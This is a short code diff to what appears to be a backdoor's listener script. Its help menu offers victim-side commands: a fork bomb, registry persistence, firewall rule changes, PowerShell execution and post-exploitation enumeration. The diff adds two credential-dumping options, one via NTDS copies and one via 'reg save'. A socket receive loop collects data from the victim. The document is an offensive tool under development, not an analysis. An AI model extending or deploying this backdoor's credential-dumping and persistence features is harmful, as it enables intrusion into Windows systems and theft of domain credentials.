@@ -32,7 +32,8 @@ help = """
 * fork -> run a fork bomb in victim machine                                    *
 * persistence -> set persistence using REGKEY (windows only)                   *
 * fw -> add firewall rules:  fw [in/out] [port number] [rule name]             *
-* hashdump -> dump ntds  credential files in c:\windows\\temp                  *
+* ntds -> dump creds using ntds  in C:\Windows\Temp\copy-ntds                  *
+* regsave -> dump creds using reg save in C:\Windows\Temp\                     *
 * powershell [cmd] OR [script] -> run the given powershell command or script   *
 * enum -> run post-exploitation enumeration                                    *
 * q -> kill the backdoor                                                       *
@@ -77,6 +78,7 @@ class listener:
 
     def receive(self):
         json_data = ""
+
         while True:
             try:
                 json_data = json_data + self.conn.recv(4096)
